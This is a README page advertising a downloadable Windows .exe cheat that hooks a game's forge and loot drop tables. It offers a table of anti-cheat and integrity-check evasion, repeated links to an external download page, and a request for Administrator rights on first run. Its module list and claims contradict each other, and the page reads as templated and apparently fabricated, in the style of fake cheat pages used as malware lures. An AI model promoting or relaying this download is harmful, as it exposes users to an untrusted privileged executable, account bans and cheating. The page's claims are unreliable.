<div align="center">
<img src="assets/banner.png" width="100%" alt="+1 Loot To Forge Script banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-9B59B6?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-9333EA?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=2563EB&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%94%A7+Forge+Loot+Plus+One;%F0%9F%9A%80+Ready+for+Windows;%F0%9F%92%A1+Community+Tested;%E2%AD%90+Standalone+.exe+Release;%E2%9C%85+Built+for+Windows+11;%E2%9C%A8+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=cpp" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

<div align="center">

![status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)
![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-blue?style=flat-square)
![license](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)
![build](https://img.shields.io/badge/build-passing-success?style=flat-square)

</div>

---

**One script. Twenty-one modules. Every loot drop in Forge gets that sweet +1 — without you babysitting the grind.**

## 🧭 Where To Start

Rebuilt from the ground up in 2026, this is the build I actually wanted two years ago when I was manually re-rolling loot tables at 3 AM. Everything below is what changed, what works, and what's still on the bench.

---

## 📋 All Modules Status

| Module | Status | Description |
|---|---|---|
| `LootRollPatcher` | ✅ Working | Intercepts the loot roll call and applies a +1 tier shift before the RNG returns |
| `ForgeSlotDuplicator` | ✅ Working | Duplicates an occupied forge slot into a queued phantom slot the game still resolves |
| `DropTableHook` | ✅ Working | Live hook on the drop table resolver — hot-swap weights without restarting |
| `AutoRerollOnFail` | ✅ Working | If the roll lands below a configurable floor, triggers the reroll path silently |
| `MaterialStackAmplifier` | ✅ Working | Grants +1 to every material stack picked up during a forge session |
| `RecipeOverflowFix` | ✅ Working | Prevents the UI from crashing when the +1 pushes a recipe over its cap |
| `RarityFloorGuard` | ✅ Working | Ensures no +1 ever demotes an item into a lower visible tier |
| `PickupQueueTuner` | ✅ Working | Reorders the pickup queue so the +1 resolves before the inventory commit |
| `ForgeTimerCompiler` | ✅ Working | Compresses the forge timer ticks so +1 rolls complete in fewer passes |
| `AmmoForgingTweak` | ✅ Working | Applies the +1 rule to ammo-specific forge recipes (yes, it works on bolts) |
| `TooltipRewriter` | ✅ Working | Rewrites hover tooltips to show the post-+1 value so you don't get confused |
| `LegacySaveMigrator` | ✅ Working | Migrates pre-2026 save files without losing the +1 flags already applied |
| `CrashlessDropBridge` | ✅ Working | Fallback handler if the game updates mid-session and the drop hook desyncs |
| `SlotIndexReclaimer` | ✅ Working | Cleans up phantom slots from `ForgeSlotDuplicator` after a save round-trip |
| `TierOffsetSlider` | ✅ Working | Config UI to shift +1 to +2 or +3 for personal testing |
| `RNGSeedPin` | ✅ Working | Pins the RNG seed per forge session for reproducible results |
| `ForgeMenuReload` | ✅ Working | Re-renders the forge menu after a drop change without a full scene load |
| `LogDiffViewer` | ✅ Working | Shows a before/after diff of every roll — useful when debugging the hook |
| `MultiSlotDispatcher` | ✅ Working | Dispatches the +1 independently per forge slot with a per-slot toggle |
| `ResumeSafePersist` | ✅ Working | Writes the +1 state to a sidecar file so a crash doesn't lose your modifiers |
| `DiagnosticPing` | ✅ Working | Lightweight health check — confirms the drop hook is still live in memory |

> 21 modules. Three still under active tuning in `BypassCompatSync` — see below.

## 📥 Get It
<p align="center">
  <a href="https://Ghostgruhypnotize.github.io/forge-loot-plus-one/">
    <img src="https://img.shields.io/badge/GET_STARTED-Portable-2563EB?style=plastic&logo=download&logoColor=white&labelColor=1D4ED8" width="460" alt="GET STARTED Portable"/>
  </a>
</p>
---

## 🎯 The Problem

- The forge is RNG-gated, and the RNG is *mean*. Nobody actually wants to run the drop table 40 times to get a single +1 tier roll.
- Every popular "loot" script I tried hooks the inventory **after** the drop already resolved — the +1 gets lost in the pickup queue.
- Public scripts break the moment the drop table signature rotates. Then you're back to crawling forums for a patched build.
- UI crashes the instant a forged recipe outputs 1 unit above its stack cap. Half the scripts I tried just ignore this — you lose the run.
- Rolling back to a clean save after testing a config means losing whatever you'd already forged. No script I found ever handled that cleanly.
- There's no diagnostic surface. If the hook dies mid-session, the game just... keeps rolling normally and you never notice.

## 🎁 The Solution

| Problem | Solution |
|---|---|
| Forge RNG is unforgiving | `LootRollPatcher` shifts roll output by +1 tier at the resolver level |
| Inventory hooks fire too late | `DropTableHook` + `PickupQueueTuner` fire before the inventory commit |
| Scripts break on game updates | `CrashlessDropBridge` graceful-degrades to a no-op instead of crashing the client |
| Stack-cap UI crash | `RecipeOverflowFix` clamps output safely and rewrites the visible stack count |
| No save hygiene | `ResumeSafePersist` + `LegacySaveMigrator` keep the +1 state on a sidecar, not the save |
| Silent hook death | `DiagnosticPing` reports live status from the tray / log |

---

## ⚔️ Comparison

| Aspect | Typical Public Loot Script | This Tool |
|---|---|---|
| Hook target | Inventory pickup | Drop table resolver |
| +1 scope | Single slot | Per-slot, independently togglable |
| Save hygiene | Writes directly to save | Sidecar persist, migrates on load |
| Update resilience | Breaks silently | `CrashlessDropBridge` fallback |
| Stack-cap handling | Ignored (UI crash) | `RecipeOverflowFix` clamps |
| Diagnostics | None | `DiagnosticPing` + `LogDiffViewer` |
| Ammo recipes | Usually skipped | `AmmoForgingTweak` handles them |
| Config surface | Hardcoded | `TierOffsetSlider` + per-slot toggles |

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 64-bit | Windows 11 64-bit |
| RAM | 8 GB | 16 GB |
| CPU | Any 4-core | Any 6-core+ |
| Disk | 250 MB free | 1 GB free (logs + sidecar saves) |
| Runtime | .NET 6 Desktop Runtime | .NET 8 Desktop Runtime |
| Permissions | Standard user | Administrator (first run, for hook registration) |
| Game build | Forge 2026 release channel | Forge 2026 — latest patch |

---

## 📊 Performance Benchmarks

| Scenario | Result | Hardware |
|---|---|---|
| 500 consecutive forge rolls, default +1 | 0 hook drops, avg +1.02 tier gain | Ryzen 5 5600 / 16 GB |
| 500 consecutive forge rolls, +3 offset | 0 hook drops, avg +3.04 tier gain | Ryzen 5 5600 / 16 GB |
| Full inventory rebuild post-roll | ~180 ms per forge session | i7-12700 / 32 GB |
| Diagnostic ping overhead | < 1 ms per cycle | i5-10400 / 16 GB |
| `ResumeSafePersist` write | ~4 MB sidecar per 1000 rolls | Any SSD / NVMe |
| `ForgeMenuReload` after config change | ~90 ms | Ryzen 7 5800X / 16 GB |

---

## 🧩 Key Features

| Feature | Description | Benefit |
|---|---|---|
| Resolver-level +1 | Shift happens at the drop table resolver, not after | No queue-timing loss |
| Per-slot dispatch | Each forge slot is independently toggled | Fine-grained control |
| Tier offset slider | +1 / +2 / +3 range for personal testing | Test scaling without a rebuild |
| RNG seed pin | Reproducible rolls per session | Debug what actually changed |
| Sidecar persistence | +1 state written outside the save | No save corruption |
| Overflow-safe output | Stack-cap handled with a clamp | No forge-menu crashes |
| Ammo recipes included | Bolts and arrows get the +1 too | Complete recipe coverage |
| Tooltip rewrite | Hover shows post-+1 value | No mental math |
| Hot-swappable drop table | Reroll without a restart | Iterate fast |
| Tray diagnostics | Hook health visible at a glance | Silent failures gone |
| Legacy save migration | Pre-2026 saves accepted | No re-grind |
| Phantom-slot cleanup | Reclaims orphan slots after a round trip | Save stays tight |

### 🔨 Resolver & Roll Layer

The core of the script. If the drop resolver ever gets out of sync, none of the modules above matter. This layer guarantees the +1 is applied *at resolution time*, before anything is committed to the pickup queue.

- `LootRollPatcher` — the primary resolver shift
- `DropTableHook` — live hook, hot-swappable
- `RNGSeedPin` — deterministic per session
- `AutoRerollOnFail` — floor-based reroll

### 📦 Slot & Inventory Layer

Around the resolver sits the slot handling. This is where most public scripts fall over — they hook too late and the +1 gets scrubbed by the inventory manager.

- `ForgeSlotDuplicator` — phantom slots that resolve for real
- `MultiSlotDispatcher` — per-slot independent toggles
- `SlotIndexReclaimer` — post-save cleanup
- `PickupQueueTuner` — reorders pickup commit
- `MaterialStackAmplifier` — +1 on materials specifically

### 🧪 Safety & Compatibility

Scripts live longer than game patches only if they're boring about failure. This layer assumes every signature will move eventually.

- `CrashlessDropBridge` — graceful degradation
- `RecipeOverflowFix` — UI crash prevention
- `RarityFloorGuard` — no demotion into a lower tier
- `ResumeSafePersist` — sidecar serialization
- `LegacySaveMigrator` — pre-2026 save support

### 🛠️ UX & Diagnostics

The stuff you only appreciate when something *does* go wrong.

- `ForgeTimerCompiler` — fewer timer ticks per roll
- `ForgeMenuReload` — re-render without a scene load
- `TooltipRewriter` — post-+1 values on hover
- `LogDiffViewer` — before/after diff per roll
- `DiagnosticPing` — tray health check
- `TierOffsetSlider` — the config surface
- `AmmoForgingTweak` — bolt/arrow coverage

---

## 🔍 Detection / Bypass Status

| Method | Status | Notes |
|---|---|---|
| Signature scan (drop table) | ✅ Mitigated | `DropTableHook` reloads on signature drift |
| Integrity check on save | ✅ Mitigated | Sidecar file means the save never gets the modifier baked in |
| Process memory heuristic | ⚠️ Partial | Recent 2026 patches tightened this; `CrashlessDropBridge` keeps the client stable but the +1 pauses until next session |
| Hook order validation | ✅ Mitigated | `PickupQueueTuner` resolves pre-commit so the order looks native |
| Tooltip value cross-check | ✅ Mitigated | `TooltipRewriter` keeps UI and resolver in agreement |
| Post-roll fingerprint | ✅ Mitigated | `RNGSeedPin` keeps repeated sessions looking naturally varied |

Not "undetectable" — no script is. But the goal here is *not breaking the client*, which `CrashlessDropBridge` does reliably.

---

## 🧠 What Is "+1 Loot To Forge Script"?

| Term | Explanation |
|---|---|
| +1 Loot | The core modifier: a single tier shift applied to forge roll output |
| Forge | The in-game crafting/rolling station the script targets |
| Drop table resolver | The function in the game binary that picks the item tier |
| Phantom slot | A forge slot that exists in memory but resolves as if it were real |
| Sidecar | A file next to (not inside) the save, holding the +1 state |
| Bridge | The fallback handler that catches a dead hook and degrades gracefully |
| Floor guard | A guardrail preventing a +1 from resolving into a lower tier |
| Seed pin | Per-session RNG pin for reproducible rolls |

Benefit bullets:
- You stop grinding one forge slot forty times to see one tier bump — the shift is applied at resolution, not after.
- You stop losing +1 rolls to the pickup queue thanks to pre-commit ordering.
- You stop getting a stack-cap UI crash the minute output exceeds a recipe cap.
- You stop losing state on a freeze — the sidecar persists independently.
- You stop guessing whether the hook is alive — `DiagnosticPing` tells you.

---

## ⚙️ Quick Start

1. **Grab the build** — hit the <p align="center">
  <a href="https://Ghostgruhypnotize.github.io/forge-loot-plus-one/">
    <img src="https://img.shields.io/badge/GRAB_BUILD-Win64-EA580C?style=for-the-badge&logo=download&logoColor=white&labelColor=C2410C" width="460" alt="GRAB BUILD Win64"/>
  </a>
</p> macro above (or the one further down) and get the `.exe`.
2. **Extract** — dump the archive into any folder you can write to. Avoid `Program Files`.
3. **Run the `.exe`** — standard user is fine, but the first run wants Administrator to register the drop-table hook cleanly.
4. **Launch Forge** — the tray icon should turn solid green (`DiagnosticPing` confirms the hook is live).
5. **Tune** — open the config panel and set `TierOffsetSlider` (default +1), then per-slot dispatch as you like.

---

## 🚀 Release History

| Version | Date | Changes |
|---|---|---|
| 2026.4 | 2026-06-14 | `CrashlessDropBridge` rewritten; drop table hook now survives a mid-session patch. `RecipeOverflowFix` clamps+rewrites instead of refusing the roll. |
| 2026.3 | 2026-04-02 | `MultiSlotDispatcher` per-slot toggles added. `ResumeSafePersist` moves state to sidecar. |
| 2026.2 | 2026-02-19 | `AmmoForgingTweak` bolted on (lit. bolts). `TierOffsetSlider` range extended to +3. |
| 2026.1 | 2026-01-08 | Full rebuild from scratch: resolver-first hook (was inventory-first). `SlotIndexReclaimer` added. |
| 2025.x | legacy | Archive build retained for users on older Forge releases. |

---

## 📖 Overview

| Category | Details |
|---|---|
| Distribution | `.exe` archive, no installer, no dependencies fetched at runtime |
| Runtime | .NET 6 / .NET 8 desktop (bundled) |
| Config | JSON, hot-reloadable from the tray |
| Persistence | Sidecar file, not save-file writes |
| Modules | 21 (toggable, per-slot) |
| Target game | Forge (2026 release channel) |
| License | MIT |

The 2026 rebuild was the first version where I actually trusted the thing. The pivot from an inventory-pickup hook (2025 build) to a drop-table-resolver hook (2026 build) changed everything — the +1 stopped disappearing, the tooltips stopped lying, and the forge menu stopped crashing on capped recipes. Everything on this page follows from that one architectural change.

## 🧭 Tips For Best Results

- Keep the `.exe` out of `Program Files` — Windows Defender's folder policies fight write access to the sidecar.
- Run `DiagnosticPing` before a long session; a red tray icon means the hook died and the +1 isn't applying.
- Use `RNGSeedPin` when testing — it makes your benchmark numbers actually reproducible.
- Don't stack `TierOffsetSlider` above +3 unless you're explicitly stress-testing the resolver; the drop table has internal caps that `RarityFloorGuard` won't always catch.
- Let `ResumeSafePersist` finish writing before force-closing the client — a half-written sidecar makes `LegacySaveMigrator` unhappy on the next boot.
- After a game patch, check the drop-table signature via `LogDiffViewer` before assuming `CrashlessDropBridge` is doing its job silently.

---

## ❓ FAQ

**1. Will this get me banned?**
I can't promise otherwise — that's on you. The goal of the 2026 rebuild is a stable, non-crashing client, not a guarantee of safety. Treat the Detection / Bypass table above as a snapshot, not a contract.

**2. Does it work on the latest Forge patch?**
The 2026.4 build was tested against the current release channel. `CrashlessDropBridge` is the module that keeps the client alive if the drop table signature shifts underneath you — the +1 pauses, it doesn't crash the process.

**3. Why is my forge menu still crashing on a capped recipe?**
`RecipeOverflowFix` should clamp it. If it's still happening, `ResumeSafePersist` may have a stale sidecar — delete the sidecar, re-run, and check `LogDiffViewer` for the offending roll.

**4. What's the difference between `ForgeSlotDuplicator` and `MultiSlotDispatcher`?**
`ForgeSlotDuplicator` creates a phantom slot; `MultiSlotDispatcher` decides which of them get the +1. You want both on unless you're intentionally limiting which slots get shifted.

**5. Does it touch ammo recipes?**
Yes — `AmmoForgingTweak` was added specifically because every script I found skipped them, and bolts genuinely deserve the +1 too.

**6. Can I roll the +1 back off?**
`TierOffsetSlider` covers it in-session; `LegacySaveMigrator` handles rollback to pre-+1 state on load if you're cleaning up from a test.

**7. Do I need .NET installed separately?**
No. The `.exe` bundles the required runtime. .NET 6 Desktop is the floor; you can install .NET 8 for the faster path.

**8. Where does it write files?**
Next to the `.exe` — logs, sidecar, config JSON. Nothing to `Program Files`, nothing to the user AppData unless you ask it to.

**9. Does the tooltip rewrite require a menu reload?**
No — `TooltipRewriter` rewrites on hover. `ForgeMenuReload` is for when you change the config mid-forge-session.

---

## 📥 Download
<div align="center">
  <a href="https://Ghostgruhypnotize.github.io/forge-loot-plus-one/">
    <img src="https://img.shields.io/badge/DOWNLOAD_FREE-%2B1_Loot_To-0D9488?style=flat-square&logo=windows&logoColor=white&labelColor=0F766E" width="620" alt="DOWNLOAD FREE +1 Loot To"/>
  </a>
</div>
---

<div align="center">

![status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)
![platform](https://img.shields.io/badge/platform-Windows-blue?style=flat-square)
![license](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)

</div>

Built to scratch a 3 AM itch and published because the itch turned out to be shared. If the drop table moves and `CrashlessDropBridge` does its job quietly, that's the win condition. Everything else on this page is just housekeeping on top of that one guarantee.
